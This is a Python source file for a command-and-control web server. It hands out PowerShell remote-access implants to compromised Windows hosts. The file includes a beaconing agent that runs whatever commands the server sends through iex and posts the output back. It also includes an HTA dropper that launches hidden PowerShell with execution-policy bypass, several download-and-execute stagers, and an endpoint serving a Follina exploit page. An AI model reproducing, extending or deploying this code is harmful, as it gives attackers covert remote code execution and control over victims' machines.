import http.server
import socketserver
import threading
import json
import base64
import time
import os


class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """This server handles each request in a separate thread."""
    daemon_threads = True  # ensures threads exit when main thread does


class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, request, client_address, server, client_manager, logger):
        self.client_manager = client_manager
        self.logger = logger
        super().__init__(request, client_address, server)

    def log_message(self, format, *args):
        self.logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")
        
    def log_command_response(self, client_id, command, response):
      self.logger(f"Command: {command}  |  Response: {response} | Client ID: {client_id}")
      self.client_manager.log_event(client_id, "Command response", f"Command: {command}  |  Response: {response}")

    def do_GET(self):
        # Log the request details
        self.log_message(f"Received GET request for {self.path}")

        if self.path == "/raw_agent":
            self.send_agent_response()
        elif self.path == "/hta_agent":
            self.send_hta_response()
        elif self.path == "/hjf_agent":
            self.send_hjf_response()
        elif self.path == "/hjfs_agent":
            self.send_hjfs_response()
        elif self.path == "/b64_stager":
            self.send_b64_stager_response()
        elif self.path == "/b52_stager":
            self.send_b52_stager_response()
        elif self.path == "/b52_agent":
            self.send_b52_agent_response()
        elif self.path == "/follina_url":
            self.send_follina_response()
        elif self.path == "/beacon":
          self.handle_beacon()
        else:
            # Send HTTP response status code
            self.send_response(200)
            # Send headers
            self.send_header("Content-type", "text/html")
            self.end_headers()
            # Prepare and send a simple HTML response
            message = "<html><body><h1>Welcome to the C2 Webserver!</h1></body></html>"
            self.wfile.write(message.encode("utf-8"))
    
    def handle_beacon(self):
      client_id = self.client_address[0]
      self.logger(f"Beacon from {client_id}")
      self.client_manager.add_client(client_id)
      commands = self.client_manager.get_pending_commands(client_id)
      self.logger(f"Commands send to client {client_id}: {commands}")
      # Log the command received from the client
      for command in commands:
          self.client_manager.log_event(client_id, "Command send", f"Type: {command['command_type']}, Args: {command['args']}")
      commands_json = json.dumps(commands)
      #send commands to the client
      self.send_response(200)
      self.send_header("Content-type", "application/json")
      self.end_headers()
      self.wfile.write(commands_json.encode("utf-8"))
      self.client_manager.clear_pending_commands(client_id)

    def send_agent_response(self):
        # Define the agent code
        agent_code = """
$client = New-Object System.Net.WebClient
$client.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$client.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
while ($true) {
    try {
        $commands = $client.DownloadString("http://{ip}:{port}/beacon") | ConvertFrom-Json
        foreach ($command in $commands) {
            Write-Host "Executing command: $($command.command_type)"
            if ($command.command_type -eq "execute") {
                $result = iex $command.args 
                $client.UploadString("http://{ip}:{port}/command_result", [string]$result)
            } elseif ($command.command_type -eq "upload") {
                # Implement upload logic here
                Write-Host "Upload command received, uploading: $($command.args)"
            }
        }
    } catch {
        Write-Host "Error: $_"
    }
    Start-Sleep -Seconds 5
}
"""
        agent_code = agent_code.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))

        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(agent_code.encode("utf-8"))
    def send_hta_response(self):
        hta_code = """
<script>
    new ActiveXObject("WScript.Shell").Run("powershell -w hidden -nop -ep bypass -c \\"IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{port}/raw_agent')\\"");
    window.close();
</script>
"""
        hta_code = hta_code.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(hta_code.encode("utf-8"))

    def send_hjf_response(self):
        hjf_code = """
$V=new-object net.webclient;
$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
IEX($s)
"""
        hjf_code = hjf_code.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(hjf_code.encode("utf-8"))

    def send_hjfs_response(self):
        hjfs_code = """
$V=new-object net.webclient;
$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$S=$V.DownloadString('http://{ip}:{port}/raw_agent');
IEX($s)
"""
        hjfs_code = hjfs_code.replace("{ip}",self.server.server_address[0]).replace("{port}",str(self.server.server_address[1]))
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(hjfs_code.encode("utf-8"))
    
    def send_b64_stager_response(self):
        raw_agent = "/raw_agent"
        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{raw_agent}');IEX($S)"
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(stager_code.encode("utf-8"))
    
    def send_b52_stager_response(self):
        b52_agent = "/b52_agent"
        stager_code = f"IEX((New-Object Net.WebClient).DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{b52_agent}'))"
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(stager_code.encode("utf-8"))

    def send_b52_agent_response(self):
        raw_agent = "/raw_agent"
        agent_code = f"IEX((New-Object Net.WebClient).DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{raw_agent}'))"
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(agent_code.encode("utf-8"))

    def send_follina_response(self):
      # Read the content of follina.html
      campaign_name = "Campaign_default"
      campaign_folder = campaign_name + "_campaign"
      agents_folder = os.path.join(campaign_folder, "agents")
      file_path = os.path.join(agents_folder, "follina.html")

      if os.path.exists(file_path):
        with open(file_path, 'r') as file:
          follina_content = file.read()
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(follina_content.encode("utf-8"))
      else:
        self.send_error(404, "Follina HTML file not found.")


    def do_POST(self):
        # Log the request details
        self.log_message(f"Received POST request for {self.path}")

        if self.path == "/command_result":
          self.handle_command_result()

        else:
            self.send_response(404)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Not Found")

    def handle_command_result(self):
      client_id = self.client_address[0]
      content_length = int(self.headers['Content-Length'])
      post_data = self.rfile.read(content_length).decode('utf-8')
      self.logger(f"Result received from {client_id} : {post_data}")
      self.client_manager.log_event(client_id, "Command Result Received", f"{post_data}")
      self.send_response(200)
      self.send_header("Content-type", "text/plain")
      self.end_headers()
      self.wfile.write(b"Command result received.")

# Global variable to hold the server instance
httpd = None

def start_webserver(ip, port, client_manager, logger):
    """Starts the web server in a separate thread."""
    global httpd
    try:
        handler = lambda *args: C2RequestHandler(*args, client_manager=client_manager, logger=logger)
        httpd = ThreadedHTTPServer((ip, port), handler)
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.daemon = True  # Allow the main program to exit even if the server is running
        server_thread.start()
        return server_thread
    except Exception as e:
        logger(f"Error starting webserver: {e}")
        raise
    
def stop_webserver():
    """Stops the web server."""
    global httpd
    if httpd:
        httpd.shutdown()
